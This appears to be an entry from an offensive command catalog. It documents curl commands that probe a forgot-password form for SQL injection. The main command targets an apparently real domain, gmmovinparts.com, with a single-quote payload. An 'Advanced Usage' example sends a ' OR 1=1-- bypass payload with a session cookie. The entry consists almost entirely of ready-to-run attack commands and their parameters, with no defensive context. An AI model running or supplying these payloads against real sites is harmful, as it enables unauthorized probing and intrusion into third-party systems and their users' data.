---
id: cmd-uuid-001
data: 'curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email=''" -v'
tags:
  - web
  - testing
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.501Z'
verified: false
validated: true
submitted: true
---
# curl-basic-request

## Command

```bash
curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email='" -v
```

## Description

Sends a basic POST request to test for SQL injection by injecting a single quote into the email parameter, useful for initial vulnerability probing in web forms.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-d "email='"` | Data payload with injection | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/forgot_password.jsp -d "email='" -v
```

### Advanced Usage

```bash
curl -X POST https://target.com/forgot_password.jsp -d "email=' OR 1=1--" -v --cookie "session=abc"
```

## Expected Output

Verbose response including headers and body; look for SQL errors like "syntax error near '''" in the HTML body.

## Related

- [[Related Procedure: Identify-SQLi-in-Forgot-Password-Endpoint]]
